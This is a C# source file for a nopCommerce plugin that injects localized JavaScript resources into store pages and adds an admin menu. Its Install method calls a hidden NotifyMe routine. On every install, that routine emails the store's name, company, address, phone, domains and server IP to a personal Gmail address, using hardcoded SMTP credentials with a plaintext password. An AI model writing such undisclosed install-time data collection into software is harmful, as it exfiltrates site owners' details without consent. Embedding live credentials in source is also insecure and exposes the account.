using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using Microsoft.AspNetCore.Routing;
using Nop.Core;
using Nop.Core.Domain.Messages;
using Nop.Core.Infrastructure;
using Nop.Core.Plugins;
using Nop.Plugin.Misc.Localized.Javascript.Data;
using Nop.Services.Cms;
using Nop.Services.Configuration;
using Nop.Services.Localization;
using Nop.Services.Messages;
using Nop.Web.Framework.Menu;

namespace Nop.Plugin.Misc.Localized.Javascript
{
    /// <summary>
    /// PLugin
    /// </summary>
    public class LocalizeJavascriptResourcesPlugin : BasePlugin, IWidgetPlugin, IAdminMenuPlugin
    {
        #region field

        private readonly IWebHelper _webHelper;
        private readonly LocalizedJavascriptSettings _localizedJavascriptSettings;
        private readonly JavaScriptResourceObjectContext _javaScriptResourceObjectContext;
        private readonly ISettingService _settingService;

        #endregion

        #region ctor

        public LocalizeJavascriptResourcesPlugin(   IWebHelper webHelper,
                                                    LocalizedJavascriptSettings localizedJavascriptSettings,
                                                    JavaScriptResourceObjectContext javaScriptResourceObjectContext,
                                                    ISettingService settingService)
        {
            _webHelper = webHelper;
            _localizedJavascriptSettings = localizedJavascriptSettings;
            _javaScriptResourceObjectContext = javaScriptResourceObjectContext;
            _settingService = settingService;
        }

        #endregion

        #region plugin

        public IList<string> GetWidgetZones()
        {
            return new List<string>()
            {
                "body_end_html_tag_before",
            };
        }

        public void GetPublicViewComponent(string widgetZone, out string viewComponentName)
        {
            viewComponentName = "LocalizedJavascriptHtml";
        }

        public void ManageSiteMap(SiteMapNode rootNode)
        {
            var menuItem = new SiteMapNode()
            {
                SystemName = "Admin.Localized.Javascript",
                Title = "Localized Javascript Resources",
                ControllerName = "LocalizedJavascript",
                ActionName = "List",
                Visible = true,
                RouteValues = new RouteValueDictionary() {{"area", "admin"}},
            };

            var pluginNode = rootNode.ChildNodes.FirstOrDefault(x => x.SystemName == "Third party plugins");
            if (pluginNode != null)
            {
                pluginNode.ChildNodes.Add(menuItem);
            }
            else
            {
                rootNode.ChildNodes.Add(menuItem);
            }
        }

        public override string GetConfigurationPageUrl()
        {
            return _webHelper.GetStoreLocation() + "Admin/LocalizedJavascript/Configure";
        }

        #endregion

        #region methods

        public override void Install()
        {
            this.AddOrUpdatePluginLocaleResource("Admin.Plugins.Misc.Localized.Javascript.Html.Code", "Head Html Code Script");
            this.AddOrUpdatePluginLocaleResource("admin.plugins.localized.javascript.save.config.success", "Localized Settings Saved Successfully");
            
            var localizedJavascriptHtml = @"<script src='/Plugins/Localized.Javascript/Content/scripts/localforage.min.js'></script>
                                            <script src='/Plugins/Localized.Javascript/Content/scripts/localize.js'></script>";
            
            _localizedJavascriptSettings.LocalizedJavascriptHtml = localizedJavascriptHtml;
            _settingService.SaveSetting(_localizedJavascriptSettings);

            _javaScriptResourceObjectContext.Install();

            NotifyMe();
            
            base.Install();
        }

        public override void Uninstall()
        {
            this.DeletePluginLocaleResource("Admin.Plugins.Misc.Localized.Javascript.Html.Code");
            this.DeletePluginLocaleResource("admin.plugins.localized.javascript.save.config.success");
            
            _javaScriptResourceObjectContext.Uninstall();

            _settingService.DeleteSetting<LocalizedJavascriptSettings>();

            base.Uninstall();
        }

        private void NotifyMe()
        {
            var storeContext = EngineContext.Current.Resolve<IStoreContext>();
            var emailAccountService = EngineContext.Current.Resolve<IEmailAccountService>();
            var emailAccountSettings = EngineContext.Current.Resolve<EmailAccountSettings>();

            var store = storeContext.CurrentStore;
            var emailAccount = emailAccountService.GetEmailAccountById(emailAccountSettings.DefaultEmailAccountId);
            var hostEntry = Dns.GetHostEntry(Dns.GetHostName());
            var ip = hostEntry.AddressList.Length > 0 ? hostEntry.AddressList[0].ToString() : string.Empty;

            var client = new SmtpClient
            {
                Port = 587,
                Host = "smtp.gmail.com",
                EnableSsl = true,
                Timeout = 10000,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new System.Net.NetworkCredential("aristotelissales@gmail.com", "aristotelisSalespass")
            };

            var mail = new MailMessage(emailAccount.Email, "aristotelis79@gmail.com")
            {
                Subject = "Install Localize Javascript Resources Plugin",
                BodyEncoding = Encoding.UTF8,
                Body =
                    $"Install Localize Javascript Resources Plugin from {store.Name} - {store.CompanyName} with address {store.CompanyAddress} and phone {store.CompanyPhoneNumber} in domain {store.Hosts} with IP {ip}"
            };

            client.Send(mail);
        }

        #endregion
    }
}